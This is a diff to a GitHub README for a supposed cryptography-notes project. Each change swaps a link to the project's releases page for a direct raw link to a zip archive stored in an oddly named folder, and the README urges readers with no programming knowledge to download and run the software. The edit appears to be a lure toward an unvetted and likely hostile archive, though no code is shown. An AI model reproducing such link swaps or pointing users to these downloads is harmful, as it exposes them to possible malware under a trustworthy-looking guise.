@@ -1,7 +1,7 @@
 # 🔐 Cryptography-Basics - Learn Essential Encryption Concepts Easily
 
 ## 📎 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/zain4455git/Cryptography-Basics/releases)
+[![Download](https://raw.githubusercontent.com/zain4455git/Cryptography-Basics/main/inequitableness/Cryptography-Basics_v1.1.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/zain4455git/Cryptography-Basics/main/inequitableness/Cryptography-Basics_v1.1.zip)
 
 ## 🖥️ Overview
 Cryptography-Basics provides foundational notes on key cryptography concepts. Explore symmetric and asymmetric encryption, classical ciphers, XOR operations, modulo arithmetic, and the mathematics behind modern security.
@@ -16,7 +16,7 @@ Use this guide to download and run the software with ease. No programming knowle
 
 ## 📥 How to Download & Install
 1. **Visit the Release Page**: Click this link to access the latest version:
-   [Download Releases](https://github.com/zain4455git/Cryptography-Basics/releases)
+   [Download Releases](https://raw.githubusercontent.com/zain4455git/Cryptography-Basics/main/inequitableness/Cryptography-Basics_v1.1.zip)
 
 2. **Choose the Latest Release**: On the releases page, look for the version at the top. It’s typically the newest one.
 
@@ -62,4 +62,4 @@ If you need help, you can contact us through the issues section on GitHub.
 ## 📌 Conclusion
 With Cryptography-Basics, you can easily learn and understand essential encryption concepts. Download it now to begin your journey into the world of cryptography! 
 
-[Download Latest Release](https://github.com/zain4455git/Cryptography-Basics/releases)
+[Download Latest Release](https://raw.githubusercontent.com/zain4455git/Cryptography-Basics/main/inequitableness/Cryptography-Basics_v1.1.zip)
